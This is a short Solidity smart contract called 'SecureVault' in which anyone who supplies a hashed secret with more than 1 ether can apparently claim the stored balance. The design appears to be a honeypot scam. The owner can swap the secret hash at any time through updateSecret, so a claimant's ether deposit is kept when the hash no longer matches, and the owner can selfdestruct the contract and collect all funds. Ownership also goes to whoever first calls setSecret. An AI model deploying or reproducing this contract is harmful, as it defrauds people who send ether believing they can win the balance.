pragma solidity ^0.4.20;

contract SecureVault {
    string public secretMessage;
    bytes32 private secretHash;
    Owner private contractOwner;

    struct Owner {
        address ownerAddress;
    }

    function SecureVault() public {
        contractOwner = Owner(address(0));
    }

    function setSecret(string _message, string _secret) public payable {
        if (secretHash == 0x0) {
            secretHash = keccak256(_secret);
            secretMessage = _message;
            contractOwner.ownerAddress = msg.sender;
        }
    }

    function updateSecret(string _message, bytes32 _newSecretHash) public payable {
        if (msg.sender == contractOwner.ownerAddress) {
            secretMessage = _message;
            secretHash = _newSecretHash;
        }
    }

    function changeOwner(address _newOwner) public {
        if (msg.sender == contractOwner.ownerAddress) {
            contractOwner.ownerAddress = _newOwner;
        }
    }

    function claimFunds(string _secret) external payable {
        require(msg.sender == tx.origin);
        if (secretHash == keccak256(_secret) && msg.value > 1 ether) {
            msg.sender.transfer(this.balance);
        }
    }

    function destroyContract() public payable {
        require(msg.sender == contractOwner.ownerAddress);
        selfdestruct(msg.sender);
    }

    function() public payable {}
}